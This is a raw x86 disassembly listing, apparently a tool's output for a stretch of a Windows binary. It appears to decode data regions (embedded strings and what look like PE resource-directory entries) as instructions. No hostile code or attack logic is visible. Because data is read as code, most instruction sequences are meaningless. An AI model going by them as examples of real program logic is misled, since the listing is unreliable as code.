  4106a3:	outs   dx,BYTE PTR ds:[esi]
  4106a4:	sub    BYTE PTR [edx],bh
  4106a6:	test   eax,0xb386b13f
  4106ab:	shl    DWORD PTR [edi-0x31],0x4e
  4106af:	xor    ebx,DWORD PTR [ebp-0x1cf21171]
  4106b5:	stos   DWORD PTR es:[edi],eax
  4106b6:	nop
  4106b7:	xor    BYTE PTR [ecx+0x51],0x5e
  4106bb:	or     al,0xe2
  4106bd:	loop   0x4106e4
  4106bf:	pop    esp
  4106c0:	stos   DWORD PTR es:[edi],eax
  4106c1:	out    dx,eax
  4106c2:	leave  
  4106c3:	jge    0x41070e
  4106c5:	fs and al,0xc
  4106c8:	sub    edx,DWORD PTR [esi-0x62]
  4106cb:	inc    eax
  4106cc:	xchg   edx,eax
  4106cd:	call   0x486a0d05
  4106d2:	into   
  4106d3:	mov    eax,ds:0x4a453683
  4106d8:	ret    
  4106d9:	jns    0x4106ac
  4106db:	xchg   ebx,eax
  4106dc:	pop    ebp
  4106dd:	add    bh,0x11
  4106e0:	and    eax,0x70c84b2d
  4106e5:	jne    0x410711
  4106e7:	test   BYTE PTR [eax+0xaccaf6f],cl
  4106ed:	in     al,0xe3
  4106ef:	dec    ecx
  4106f0:	push   ds
  4106f1:	dec    edi
  4106f2:	and    edi,esp
  4106f4:	lds    eax,FWORD PTR [edi+0x491e0d]
	...
  41073e:	add    BYTE PTR [ebx+0x1b],bh
  410741:	adc    BYTE PTR [eax],al
  410743:	lods   al,BYTE PTR ds:[esi]
  410744:	push   ebp
  410745:	adc    BYTE PTR [eax],al
  410747:	punpcklwd mm2,DWORD PTR [eax]
  41074a:	add    BYTE PTR [edi+0x6300100d],ch
  410750:	adc    BYTE PTR gs:[eax],al
  410753:	shl    BYTE PTR [edi],0x10
  410756:	add    BYTE PTR [ecx+0x7300101d],dh
  41075c:	js     0x41076e
  41075e:	add    BYTE PTR [ebp+0x38],al
  410761:	xor    eax,0x565f3235
  410766:	aaa    
  410767:	add    BYTE PTR [eax+0x30],dl
  41076a:	push   esp
  41076b:	pop    edi
  41076c:	inc    edi
  41076d:	dec    ebp
  41076e:	xor    bl,BYTE PTR [edx+0x5f]
  410771:	inc    esp
  410772:	ss xor BYTE PTR ss:0x4f494c00,dh
  41077a:	xor    BYTE PTR [edi],dh
  41077c:	pop    edi
  41077d:	dec    edx
  41077e:	inc    ecx
  41077f:	add    BYTE PTR [ecx+0x47],bl
  410782:	pop    edx
  410783:	xor    eax,0x4442595f
  410788:	dec    esi
  410789:	inc    ebx
  41078a:	pop    edi
  41078b:	xor    eax,0x334a0048
  410790:	push   ecx
  410791:	pop    edi
  410792:	xor    al,BYTE PTR [esi+0x35]
  410795:	push   eax
  410796:	cmp    DWORD PTR [eax],edi
  410798:	add    BYTE PTR [ebp+0x32],dl
  41079b:	push   edi
  41079c:	xor    BYTE PTR [edi+0x42],bl
  41079f:	dec    eax
  4107a0:	inc    ebp
  4107a1:	pop    edi
  4107a2:	xor    ebx,DWORD PTR [eax+0x46]
  4107a5:	dec    ebx
  4107a6:	inc    esp
  4107a7:	aaa    
  4107a8:	add    BYTE PTR [edi+0x46],cl
  4107ab:	push   esi
  4107ac:	xor    al,0x34
  4107ae:	pop    edi
  4107af:	inc    edi
  4107b0:	inc    edi
  4107b1:	push   esp
  4107b2:	pop    edx
  4107b3:	inc    edx
  4107b4:	pop    edi
  4107b5:	push   ebp
  4107b6:	add    BYTE PTR [edi+0x41],al
  4107b9:	xor    al,0x39
  4107bb:	xor    BYTE PTR [edi+0x39],bl
  4107be:	inc    edx
  4107bf:	add    BYTE PTR [esi+0x36],cl
  4107c2:	xor    bl,BYTE PTR [edi+0x41]
  4107c5:	xor    ebx,DWORD PTR ss:[edi+0x38]
  4107c9:	xor    eax,DWORD PTR [ecx+0x52]
  4107cc:	push   ebx
  4107cd:	pop    edi
  4107ce:	inc    esi
  4107cf:	add    BYTE PTR [ecx+0x57],al
  4107d2:	push   ebp
  4107d3:	pop    edi
  4107d4:	inc    esi
  4107d5:	pop    edx
  4107d6:	push   ebp
  4107d7:	xor    dh,BYTE PTR [esi]
  4107d9:	add    BYTE PTR [edi+0x48],al
  4107dc:	xor    BYTE PTR [edi+0x33],bl
  4107df:	inc    ebp
  4107e0:	cmp    DWORD PTR [edi+0x5f],ecx
  4107e3:	push   ebx
  4107e4:	cmp    DWORD PTR [eax],eax
  4107e6:	push   esp
  4107e7:	xor    al,0x51
  4107e9:	cmp    BYTE PTR [esi],dh
  4107eb:	pop    edi
  4107ec:	push   esp
  4107ed:	dec    ecx
  4107ee:	dec    edi
  4107ef:	add    BYTE PTR [esp+ecx*2+0x5a],al
  4107f3:	pop    edi
  4107f4:	pop    edx
  4107f5:	dec    edx
  4107f6:	cmp    BYTE PTR [ebx+eax*2+0x5f],dl
  4107fa:	cmp    DWORD PTR [ecx],edi
  4107fc:	add    BYTE PTR [eax+0x4e],dl
  4107ff:	xor    al,0x5f
  410801:	dec    esi
  410802:	inc    esp
  410803:	xor    DWORD PTR [edi],esi
  410805:	pop    edi
  410806:	cmp    DWORD PTR [ecx+0x41],edx
  410809:	add    BYTE PTR [edx+0x54],cl
  41080c:	xor    bl,BYTE PTR [edi+0x50]
  41080f:	push   ebx
  410810:	push   esi
  410811:	inc    esp
  410812:	pop    edi
  410813:	push   edx
  410814:	xor    BYTE PTR [ecx+0x0],bl
  410817:	push   esi
  410818:	inc    esp
  410819:	push   esp
  41081a:	pop    edi
  41081b:	dec    esp
  41081c:	xor    al,0x33
  41081e:	cmp    DWORD PTR [eax+eax*1+0x59],edx
  410822:	inc    edi
  410823:	inc    ebp
  410824:	pop    edi
  410825:	push   ebp
  410826:	pop    edx
  410827:	push   eax
  410828:	dec    edi
  410829:	pop    edi
  41082a:	push   esi
  41082b:	xor    BYTE PTR [eax],al
  41082d:	pop    eax
  41082e:	push   edi
  41082f:	push   esi
  410830:	cmp    BYTE PTR [edi+0x47],bl
  410833:	dec    ecx
  410834:	push   esp
  410835:	push   edx
  410836:	dec    ebx
  410837:	xor    BYTE PTR [edi+0x0],cl
  41083a:	dec    ecx
  41083b:	dec    esi
  41083c:	xor    eax,0x33345f30
  410841:	push   eax
  410842:	dec    edx
  410843:	cmp    BYTE PTR [eax],al
  410845:	pop    eax
  410846:	inc    ecx
  410847:	dec    esi
  410848:	pop    edi
  410849:	inc    edx
  41084a:	push   ebp
  41084b:	push   ecx
  41084c:	pop    edi
  41084d:	inc    ecx
  41084e:	add    BYTE PTR [edi+0x58],al
  410851:	xor    BYTE PTR [edi+0x4c],bl
  410854:	dec    ebp
  410855:	cmp    DWORD PTR [ebp+0x5f],edx
  410858:	push   esp
  410859:	push   edx
  41085a:	add    BYTE PTR [eax+0x38],cl
  41085d:	dec    edi
  41085e:	xor    eax,0x594b535f
  410863:	xor    BYTE PTR [ebp+0x0],cl
  410866:	inc    ecx
  410867:	dec    eax
  410868:	xor    DWORD PTR [edi+0x4e],ebx
  41086b:	ss inc esp
  41086d:	dec    eax
  41086e:	cmp    DWORD PTR [eax],eax
  410870:	push   esi
  410871:	push   esp
  410872:	aaa    
  410873:	xor    bh,BYTE PTR [ecx]
  410875:	xor    al,0x31
  410877:	pop    edi
  410878:	push   edx
  410879:	push   edi
  41087a:	push   edx
  41087b:	dec    ecx
  41087c:	pop    edi
  41087d:	inc    esp
  41087e:	add    BYTE PTR [edi+0x52],dl
  410881:	pop    ecx
  410882:	xor    eax,0x5045395f
  410887:	pop    edi
  410888:	xor    eax,DWORD PTR [eax]
  41088a:	inc    ebp
  41088b:	xor    dl,BYTE PTR [ebx+0x39]
  41088e:	xor    dh,BYTE PTR [esi]
  410890:	xor    eax,0x4900525f
  410895:	push   esp
  410896:	xor    bl,BYTE PTR [edi+0x41]
  410899:	dec    edx
  41089a:	xor    eax,0x4c3737
  41089f:	push   ecx
  4108a0:	add    BYTE PTR [edi+0x0],al
  4108a3:	pop    ecx
  4108a4:	add    BYTE PTR [edi+0x0],bl
  4108a7:	push   ebx
  4108a8:	add    BYTE PTR [ebx+0x0],al
  4108ab:	xor    al,BYTE PTR [eax]
  4108ad:	pop    edx
  4108ae:	add    BYTE PTR [edi+0x0],dl
  4108b1:	add    BYTE PTR [eax],al
  4108b3:	push   edx
  4108b4:	add    BYTE PTR [eax+eax*1+0x4d],dl
  4108b8:	add    BYTE PTR [edi+0x0],bl
  4108bb:	dec    eax
  4108bc:	add    BYTE PTR [ebx+0x0],cl
  4108bf:	xor    DWORD PTR [eax],eax
  4108c1:	pop    edi
  4108c2:	add    BYTE PTR [ecx+0x0],al
  4108c5:	push   ebp
  4108c6:	add    BYTE PTR [ecx],bh
  4108c8:	add    BYTE PTR [esi+0x0],dl
  4108cb:	xor    al,BYTE PTR [eax]
  4108cd:	pop    edi
  4108ce:	add    BYTE PTR [edx],dh
  4108d0:	add    BYTE PTR [eax],al
  4108d2:	add    BYTE PTR [ecx+0x0],dl
  4108d5:	xor    al,0x0
  4108d7:	inc    edx
  4108d8:	add    BYTE PTR [edi+0x0],bl
  4108db:	inc    esp
  4108dc:	add    BYTE PTR [esi+0x0],dl
  4108df:	xor    eax,0x5f005500
  4108e4:	add    BYTE PTR [ebx+0x0],al
  4108e7:	inc    ebx
  4108e8:	add    BYTE PTR [eax],al
  4108ea:	add    BYTE PTR [eax+0x0],cl
  4108ed:	inc    edx
  4108ee:	add    BYTE PTR [ecx+0x0],dl
  4108f1:	pop    edi
  4108f2:	add    BYTE PTR [eax+eax*1+0x38],dl
  4108f6:	add    BYTE PTR [eax+0x0],dl
  4108f9:	push   edx
  4108fa:	add    BYTE PTR [ecx+0x0],cl
  4108fd:	pop    edi
  4108fe:	add    BYTE PTR [ebp+0x0],al
  410901:	dec    ebp
  410902:	add    BYTE PTR [ebp+0x0],dl
  410905:	add    BYTE PTR [eax],al
  410907:	inc    edi
  410908:	add    BYTE PTR [edi+0x0],cl
  41090b:	xor    eax,0x32005f00
  410910:	add    BYTE PTR [ebx+0x0],dl
  410913:	inc    ebp
  410914:	add    BYTE PTR [ecx],bh
  410916:	add    BYTE PTR [esi],dh
  410918:	add    BYTE PTR [edi+0x0],bl
  41091b:	pop    eax
  41091c:	add    BYTE PTR [edx+0x0],bl
  41091f:	xor    al,0x0
  410921:	pop    edi
  410922:	add    BYTE PTR [edi+0x0],cl
  410925:	add    BYTE PTR [eax],al
  410927:	push   ebx
  410928:	add    BYTE PTR [eax],dh
  41092a:	add    BYTE PTR [ecx+0x0],dl
  41092d:	pop    edi
  41092e:	add    BYTE PTR [ebp+0x0],dl
  410931:	dec    ecx
  410932:	add    BYTE PTR [ecx+0x0],bl
  410935:	xor    al,BYTE PTR [eax]
  410937:	add    BYTE PTR [eax],al
  410939:	dec    eax
  41093a:	add    BYTE PTR [edi],dh
  41093c:	add    BYTE PTR [ecx+0x0],bl
  41093f:	aaa    
  410940:	add    BYTE PTR [edi+0x0],bl
  410943:	inc    esi
  410944:	add    BYTE PTR [edi],dh
  410946:	add    BYTE PTR [ecx+0x0],bl
  410949:	inc    esp
  41094a:	add    BYTE PTR [edi+0x0],bl
  41094d:	xor    eax,0x52000000
  410952:	add    BYTE PTR [eax+0x0],dl
  410955:	inc    esi
  410956:	add    BYTE PTR [edi+0x0],bl
  410959:	dec    esp
  41095a:	add    BYTE PTR [ecx+0x0],al
  41095d:	push   eax
  41095e:	add    BYTE PTR [edi+0x0],bl
  410961:	inc    ecx
  410962:	add    BYTE PTR [edi],dh
  410964:	add    BYTE PTR [eax+eax*1+0x4a],al
  410968:	add    BYTE PTR [ebp+0x0],al
  41096b:	pop    edi
  41096c:	add    BYTE PTR [eax+eax*1],dh
  41096f:	add    BYTE PTR [eax],al
  410971:	dec    esp
  410972:	add    BYTE PTR [edi],dh
  410974:	add    BYTE PTR [ebp+0x0],cl
  410977:	cmp    BYTE PTR [eax],al
  410979:	xor    al,BYTE PTR [eax]
  41097b:	pop    edi
  41097c:	add    BYTE PTR [eax],bh
  41097e:	add    BYTE PTR [ecx+0x0],al
  410981:	pop    edx
  410982:	add    BYTE PTR [edx+0x0],bl
  410985:	pop    edi
  410986:	add    BYTE PTR [ebx],dh
  410988:	add    BYTE PTR [ebx+0x0],dl
  41098b:	add    BYTE PTR [eax],al
  41098d:	push   esi
  41098e:	add    BYTE PTR [eax],bh
  410990:	add    BYTE PTR [esi+0x0],dl
  410993:	xor    al,BYTE PTR [eax]
  410995:	pop    edi
  410996:	add    BYTE PTR [esi+0x0],al
  410999:	inc    ebx
  41099a:	add    BYTE PTR [edi+0x0],al
  41099d:	push   edi
  41099e:	add    BYTE PTR [edi+0x0],bl
  4109a1:	dec    eax
  4109a2:	add    BYTE PTR [edx+0x0],cl
  4109a5:	cmp    DWORD PTR [eax],eax
  4109a7:	aaa    
  4109a8:	add    BYTE PTR [eax],al
  4109aa:	add    BYTE PTR [ecx+0x0],cl
  4109ad:	dec    edx
  4109ae:	add    BYTE PTR [ecx+0x0],al
  4109b1:	pop    edi
  4109b2:	add    BYTE PTR [edx+0x0],cl
  4109b5:	inc    esi
  4109b6:	add    BYTE PTR [edi+0x0],dl
  4109b9:	xor    eax,DWORD PTR [eax]
  4109bb:	dec    ebp
  4109bc:	add    BYTE PTR [edi+0x0],bl
  4109bf:	push   eax
  4109c0:	add    BYTE PTR [ecx+0x0],al
  4109c3:	add    BYTE PTR [eax],al
  4109c5:	dec    edi
  4109c6:	add    BYTE PTR [ecx+0x0],bl
  4109c9:	dec    eax
  4109ca:	add    BYTE PTR [edi+0x0],bl
  4109cd:	xor    eax,0x0
	...
  4109da:	add    al,0x0
  4109dc:	add    BYTE PTR [eax],al
  4109de:	or     al,0x0
  4109e0:	add    BYTE PTR [eax],al
  4109e2:	rol    BYTE PTR [esi],1
  4109e4:	add    BYTE PTR [eax-0x7fffff90],al
  4109ea:	or     al,BYTE PTR [edi]
  4109ec:	add    BYTE PTR [eax-0x7fffff70],al
  4109f2:	xor    al,0x7
  4109f4:	add    BYTE PTR [eax-0x7fffff58],al
  4109fa:	pusha  
  4109fb:	pop    es
  4109fc:	add    BYTE PTR [eax-0x7fffff40],al
  410a02:	loopne 0x410a0b
  410a04:	add    BYTE PTR [eax-0x7fffff08],al
  410a0a:	adc    BYTE PTR [eax],cl
  410a0c:	add    BYTE PTR [eax-0x7ffffee0],al
  410a12:	sub    BYTE PTR [eax],cl
  410a14:	add    BYTE PTR [eax-0x7ffffec8],al
  410a1a:	pop    eax
  410a1b:	or     BYTE PTR [eax],al
  410a1d:	adc    BYTE PTR [eax+0x1],0x0
  410a21:	cmp    BYTE PTR [edx-0x7f7ffff8],0x1
  410a28:	add    BYTE PTR [eax-0x7ffff714],al
  410a2e:	mov    al,ds:0xa800001
  410a33:	or     DWORD PTR [eax],eax
  410a35:	adc    al,0x1
  410a38:	add    BYTE PTR [eax-0x7ffff6dc],al
  410a3e:	lock add DWORD PTR [eax],eax
  410a41:	add    BYTE PTR [eax],0x0
  410a44:	add    BYTE PTR [eax],al
  410a46:	add    BYTE PTR [eax],al
  410a48:	add    BYTE PTR [eax],al
  410a4a:	add    al,0x0
  410a4c:	add    BYTE PTR [eax],al
  410a4e:	add    DWORD PTR [eax],eax
  410a50:	add    DWORD PTR [eax],eax
  410a52:	in     al,dx
  410a53:	push   es
  410a54:	add    BYTE PTR [eax-0x7ffffde0],al
  410a5a:	in     eax,dx
  410a5b:	push   0x0
  410a5d:	add    BYTE PTR [eax],bh
  410a5f:	add    al,BYTE PTR [eax]
  410a61:	add    BYTE PTR [eax],0x0
  410a64:	add    BYTE PTR [eax],al
  410a66:	add    BYTE PTR [eax],al
  410a68:	add    BYTE PTR [eax],al
  410a6a:	add    al,0x0
  410a6c:	add    BYTE PTR [eax],al
  410a6e:	add    DWORD PTR [eax],eax
  410a70:	add    BYTE PTR [eax],al
  410a72:	sbb    al,0x7
  410a74:	add    BYTE PTR [eax-0x7ffffdb0],al
	...
  410a82:	add    al,0x0
  410a84:	add    BYTE PTR [eax],al
  410a86:	add    DWORD PTR [eax],eax
  410a88:	add    BYTE PTR [eax],al
  410a8a:	dec    esi
  410a8b:	pop    es
  410a8c:	add    BYTE PTR [eax-0x7ffffd98],al
	...
  410a9a:	add    al,0x0
  410a9c:	add    BYTE PTR [eax],al
  410a9e:	add    eax,0x72000000
  410aa3:	pop    es
  410aa4:	add    BYTE PTR [eax-0x7ffffd80],al
  410aaa:	test   BYTE PTR [edi],al
  410aac:	add    BYTE PTR [eax-0x7ffffd68],al
  410ab2:	call   0x2:0xb0800007
  410ab9:	xor    BYTE PTR [edx-0x377ffff9],0x2
  410ac0:	add    BYTE PTR [eax-0x7ffff834],al
  410ac6:	loopne 0x410aca
  410ac8:	add    BYTE PTR [eax+0x0],al
  410ace:	add    BYTE PTR [eax],al
  410ad0:	add    BYTE PTR [eax],al
  410ad2:	add    al,0x0
  410ad4:	add    BYTE PTR [eax],al
  410ad6:	add    DWORD PTR [eax],eax
  410ad8:	add    al,BYTE PTR [eax]
  410ada:	inc    BYTE PTR [edi]
  410adc:	add    BYTE PTR [eax-0x7ffffd08],al
  410ae2:	ins    BYTE PTR es:[edi],dx
  410ae3:	adc    DWORD PTR [eax],eax
  410ae5:	add    BYTE PTR [eax],dl
  410ae7:	add    eax,DWORD PTR [eax]
  410ae9:	sub    BYTE PTR [ebp+0x28000024],0x3
  410af0:	add    BYTE PTR [eax+0x0],al
  410af6:	add    BYTE PTR [eax],al
  410af8:	add    BYTE PTR [eax],al
  410afa:	add    al,0x0
  410afc:	add    BYTE PTR [eax],al
  410afe:	add    BYTE PTR [eax],al
  410b00:	add    DWORD PTR [eax],eax
  410b02:	mov    esp,0x40000047
  410b07:	add    eax,DWORD PTR [eax]
  410b09:	add    BYTE PTR [eax],0x0
  410b0c:	add    BYTE PTR [eax],al
  410b0e:	add    BYTE PTR [eax],al
  410b10:	add    BYTE PTR [eax],al
  410b12:	add    al,0x0
  410b14:	add    BYTE PTR [eax],al
  410b16:	add    DWORD PTR [eax],eax
  410b18:	add    BYTE PTR [eax],al
  410b1a:	inc    esp
  410b1b:	or     BYTE PTR [eax],al
  410b1d:	sbb    BYTE PTR [eax+0x3],0x0
  410b21:	add    BYTE PTR [eax],0x0
  410b24:	add    BYTE PTR [eax],al
  410b26:	add    BYTE PTR [eax],al
  410b28:	add    BYTE PTR [eax],al
  410b2a:	add    al,0x0
  410b2c:	add    BYTE PTR [eax],al
  410b2e:	add    eax,DWORD PTR [eax]
  410b30:	add    DWORD PTR [eax],eax
  410b32:	outs   dx,BYTE PTR ds:[esi]
  410b33:	or     BYTE PTR [eax],al
  410b35:	xor    BYTE PTR [eax+0x3],0x0
  410b39:	add    BYTE PTR [eax+ecx*1+0x3888000],0x0
  410b41:	sbb    BYTE PTR [eax+ecx*1+0x3a08000],0x0
  410b49:	cmp    BYTE PTR [esi],0x75
  410b4c:	add    BYTE PTR [eax],al
  410b4e:	mov    eax,0x800003
  410b53:	add    BYTE PTR [eax],al
  410b55:	add    BYTE PTR [eax],al
  410b57:	add    BYTE PTR [eax],al
  410b59:	add    BYTE PTR [eax+eax*1],al
  410b5c:	add    BYTE PTR [eax],al
  410b5e:	add    DWORD PTR [eax],eax
  410b60:	add    DWORD PTR [eax],eax
  410b62:	ror    BYTE PTR [eax],cl
  410b64:	add    BYTE PTR [eax-0x7ffffc30],al
  410b6a:	jae    0x410bd0
  410b6c:	add    BYTE PTR [eax],al
  410b6e:	call   0xc10b76
  410b73:	add    BYTE PTR [eax],al
  410b75:	add    BYTE PTR [eax],al
  410b77:	add    BYTE PTR [eax],al
  410b79:	add    BYTE PTR [eax+eax*1],al
  410b7c:	add    BYTE PTR [eax],al
  410b7e:	add    BYTE PTR [eax],al
  410b80:	add    al,0x0
  410b82:	jmp    0x410b9e
  410b84:	add    BYTE PTR [eax],al
  410b86:	add    BYTE PTR [eax+eax*1],al
  410b89:	add    ch,0x3a
  410b8c:	add    BYTE PTR [eax],al
  410b8e:	sbb    BYTE PTR [eax+eax*1],al
  410b91:	sub    BYTE PTR [ebx+0x30000040],0x4
  410b98:	add    BYTE PTR [eax+0x4b9e],al
  410b9e:	dec    eax
  410b9f:	add    al,0x0
  410ba1:	add    BYTE PTR [eax],0x0
  410ba4:	add    BYTE PTR [eax],al
  410ba6:	add    BYTE PTR [eax],al
  410ba8:	add    BYTE PTR [eax],al
  410baa:	add    al,0x0
  410bac:	add    BYTE PTR [eax],al
  410bae:	add    BYTE PTR [eax],al
  410bb0:	add    al,BYTE PTR [eax]
  410bb2:	repz and al,0x0
  410bb5:	add    BYTE PTR [eax+0x4],ah
  410bb8:	add    BYTE PTR [eax+0x2ca1],al
  410bbe:	js     0x410bc4
  410bc0:	add    BYTE PTR [eax+0x0],al
  410bc6:	add    BYTE PTR [eax],al
  410bc8:	add    BYTE PTR [eax],al
  410bca:	add    al,0x0
  410bcc:	add    BYTE PTR [eax],al
  410bce:	add    DWORD PTR [eax],eax
  410bd0:	add    eax,DWORD PTR [eax]
  410bd2:	or     DWORD PTR ss:[eax],eax
  410bd5:	adc    BYTE PTR [eax-0xa7ffffc],0xf
  410bdc:	add    BYTE PTR [eax],al
  410bde:	test   al,0x4
  410be0:	add    BYTE PTR [eax+0x1e90],al
  410be6:	rol    BYTE PTR [eax+eax*1],0x80
  410bea:	bound  esp,QWORD PTR [edi]
  410bec:	add    BYTE PTR [eax],al
  410bee:	fadd   DWORD PTR [eax+eax*1]
  410bf1:	add    BYTE PTR [eax],0x0
  410bf4:	add    BYTE PTR [eax],al
  410bf6:	add    BYTE PTR [eax],al
  410bf8:	add    BYTE PTR [eax],al
  410bfa:	add    al,0x0
  410bfc:	add    BYTE PTR [eax],al
  410bfe:	add    BYTE PTR [eax],al
  410c00:	add    DWORD PTR [eax],eax
  410c02:	or     DWORD PTR [eax+eax*1],eax
  410c05:	add    al,dh
  410c07:	add    al,0x0
	...
  410c11:	add    BYTE PTR [eax+eax*1],al
  410c14:	add    BYTE PTR [eax],al
  410c16:	add    BYTE PTR [eax],al
  410c18:	add    DWORD PTR [eax],eax
  410c1a:	or     DWORD PTR [eax+eax*1],eax
  410c1d:	add    BYTE PTR [eax],al
  410c1f:	add    eax,0x0
  410c24:	add    BYTE PTR [eax],al
  410c26:	add    BYTE PTR [eax],al
  410c28:	add    BYTE PTR [eax],al
  410c2a:	add    al,0x0
  410c2c:	add    BYTE PTR [eax],al
  410c2e:	add    BYTE PTR [eax],al
  410c30:	add    DWORD PTR [eax],eax
  410c32:	or     DWORD PTR [eax+eax*1],eax
  410c35:	add    BYTE PTR [eax],dl
  410c37:	add    eax,0x0
  410c3c:	add    BYTE PTR [eax],al
  410c3e:	add    BYTE PTR [eax],al
  410c40:	add    BYTE PTR [eax],al
  410c42:	add    al,0x0
  410c44:	add    BYTE PTR [eax],al
  410c46:	add    BYTE PTR [eax],al
  410c48:	add    DWORD PTR [eax],eax
  410c4a:	or     DWORD PTR [eax+eax*1],eax
  410c4d:	add    BYTE PTR [eax],ah
  410c4f:	add    eax,0x0
  410c54:	add    BYTE PTR [eax],al
  410c56:	add    BYTE PTR [eax],al
  410c58:	add    BYTE PTR [eax],al
  410c5a:	add    al,0x0
  410c5c:	add    BYTE PTR [eax],al
  410c5e:	add    BYTE PTR [eax],al
  410c60:	add    DWORD PTR [eax],eax
  410c62:	or     DWORD PTR [eax+eax*1],eax
  410c65:	add    BYTE PTR [eax],dh
  410c67:	add    eax,0x0
  410c6c:	add    BYTE PTR [eax],al
  410c6e:	add    BYTE PTR [eax],al
  410c70:	add    BYTE PTR [eax],al
  410c72:	add    al,0x0
  410c74:	add    BYTE PTR [eax],al
  410c76:	add    BYTE PTR [eax],al
  410c78:	add    DWORD PTR [eax],eax
  410c7a:	or     DWORD PTR [eax+eax*1],eax
  410c7d:	add    BYTE PTR [eax+0x5],al
	...
  410c88:	add    BYTE PTR [eax],al
  410c8a:	add    al,0x0
  410c8c:	add    BYTE PTR [eax],al
  410c8e:	add    BYTE PTR [eax],al
  410c90:	add    DWORD PTR [eax],eax
  410c92:	or     DWORD PTR [eax+eax*1],eax
  410c95:	add    BYTE PTR [eax+0x5],dl
	...
  410ca0:	add    BYTE PTR [eax],al
  410ca2:	add    al,0x0
  410ca4:	add    BYTE PTR [eax],al
  410ca6:	add    BYTE PTR [eax],al
  410ca8:	add    DWORD PTR [eax],eax
  410caa:	or     DWORD PTR [eax+eax*1],eax
  410cad:	add    BYTE PTR [eax+0x5],ah
	...
  410cb8:	add    BYTE PTR [eax],al
  410cba:	add    al,0x0
  410cbc:	add    BYTE PTR [eax],al
  410cbe:	add    BYTE PTR [eax],al
  410cc0:	add    DWORD PTR [eax],eax
  410cc2:	or     DWORD PTR [eax+eax*1],eax
  410cc5:	add    BYTE PTR [eax+0x5],dh
	...
  410cd0:	add    BYTE PTR [eax],al
  410cd2:	add    al,0x0
  410cd4:	add    BYTE PTR [eax],al
  410cd6:	add    BYTE PTR [eax],al
  410cd8:	add    DWORD PTR [eax],eax
  410cda:	or     DWORD PTR [eax+eax*1],eax
  410cdd:	add    BYTE PTR [eax+0x5],al
  410ce3:	add    BYTE PTR [eax],al
  410ce5:	add    BYTE PTR [eax],al
  410ce7:	add    BYTE PTR [eax],al
  410ce9:	add    BYTE PTR [eax+eax*1],al
  410cec:	add    BYTE PTR [eax],al
  410cee:	add    BYTE PTR [eax],al
  410cf0:	add    DWORD PTR [eax],eax
  410cf2:	or     DWORD PTR [eax+eax*1],eax
  410cf5:	add    BYTE PTR [eax+0x5],dl
  410cfb:	add    BYTE PTR [eax],al
  410cfd:	add    BYTE PTR [eax],al
  410cff:	add    BYTE PTR [eax],al
  410d01:	add    BYTE PTR [eax+eax*1],al
  410d04:	add    BYTE PTR [eax],al
  410d06:	add    BYTE PTR [eax],al
  410d08:	add    DWORD PTR [eax],eax
  410d0a:	or     DWORD PTR [eax+eax*1],eax
  410d0d:	add    BYTE PTR [eax+0x5],ah
  410d13:	add    BYTE PTR [eax],al
  410d15:	add    BYTE PTR [eax],al
  410d17:	add    BYTE PTR [eax],al
  410d19:	add    BYTE PTR [eax+eax*1],al
  410d1c:	add    BYTE PTR [eax],al
  410d1e:	add    BYTE PTR [eax],al
  410d20:	add    DWORD PTR [eax],eax
  410d22:	or     DWORD PTR [eax+eax*1],eax
  410d25:	add    BYTE PTR [eax+0x5],dh
  410d2b:	add    BYTE PTR [eax],al
  410d2d:	add    BYTE PTR [eax],al
  410d2f:	add    BYTE PTR [eax],al
  410d31:	add    BYTE PTR [eax+eax*1],al
  410d34:	add    BYTE PTR [eax],al
  410d36:	add    BYTE PTR [eax],al
  410d38:	add    DWORD PTR [eax],eax
  410d3a:	or     DWORD PTR [eax+eax*1],eax
  410d3d:	add    al,al
  410d3f:	add    eax,0x0
  410d44:	add    BYTE PTR [eax],al
  410d46:	add    BYTE PTR [eax],al
  410d48:	add    BYTE PTR [eax],al
  410d4a:	add    al,0x0
  410d4c:	add    BYTE PTR [eax],al
  410d4e:	add    BYTE PTR [eax],al
  410d50:	add    DWORD PTR [eax],eax
  410d52:	or     DWORD PTR [eax+eax*1],eax
  410d55:	add    al,dl
  410d57:	add    eax,0x0
  410d5c:	add    BYTE PTR [eax],al
  410d5e:	add    BYTE PTR [eax],al
  410d60:	add    BYTE PTR [eax],al
  410d62:	add    al,0x0
  410d64:	add    BYTE PTR [eax],al
  410d66:	add    BYTE PTR [eax],al
  410d68:	add    DWORD PTR [eax],eax
  410d6a:	or     DWORD PTR [eax+eax*1],eax
  410d6d:	add    al,ah
  410d6f:	add    eax,0x0
  410d74:	add    BYTE PTR [eax],al
  410d76:	add    BYTE PTR [eax],al
  410d78:	add    BYTE PTR [eax],al
  410d7a:	add    al,0x0
  410d7c:	add    BYTE PTR [eax],al
  410d7e:	add    BYTE PTR [eax],al
  410d80:	add    DWORD PTR [eax],eax
  410d82:	or     DWORD PTR [eax+eax*1],eax
  410d85:	add    al,dh
  410d87:	add    eax,0x0
  410d8c:	add    BYTE PTR [eax],al
  410d8e:	add    BYTE PTR [eax],al
  410d90:	add    BYTE PTR [eax],al
  410d92:	add    al,0x0
  410d94:	add    BYTE PTR [eax],al
  410d96:	add    BYTE PTR [eax],al
  410d98:	add    DWORD PTR [eax],eax
  410d9a:	or     DWORD PTR [eax+eax*1],eax
  410d9d:	add    BYTE PTR [eax],al
  410d9f:	push   es
	...
  410da8:	add    BYTE PTR [eax],al
  410daa:	add    al,0x0
  410dac:	add    BYTE PTR [eax],al
  410dae:	add    BYTE PTR [eax],al
  410db0:	add    DWORD PTR [eax],eax
  410db2:	or     DWORD PTR [eax+eax*1],eax
  410db5:	add    BYTE PTR [eax],dl
  410db7:	push   es
	...
  410dc0:	add    BYTE PTR [eax],al
  410dc2:	add    al,0x0
  410dc4:	add    BYTE PTR [eax],al
  410dc6:	add    BYTE PTR [eax],al
  410dc8:	add    DWORD PTR [eax],eax
  410dca:	or     DWORD PTR [eax+eax*1],eax
  410dcd:	add    BYTE PTR [eax],ah
  410dcf:	push   es
	...
  410dd8:	add    BYTE PTR [eax],al
  410dda:	add    al,0x0
  410ddc:	add    BYTE PTR [eax],al
  410dde:	add    BYTE PTR [eax],al
  410de0:	add    DWORD PTR [eax],eax
  410de2:	or     DWORD PTR [eax+eax*1],eax
  410de5:	add    BYTE PTR [eax],dh
  410de7:	push   es
	...
  410df0:	add    BYTE PTR [eax],al
  410df2:	add    al,0x0
  410df4:	add    BYTE PTR [eax],al
  410df6:	add    BYTE PTR [eax],al
  410df8:	add    DWORD PTR [eax],eax
  410dfa:	or     DWORD PTR [eax+eax*1],eax
  410dfd:	add    BYTE PTR [eax+0x6],al
	...
  410e08:	add    BYTE PTR [eax],al
  410e0a:	add    al,0x0
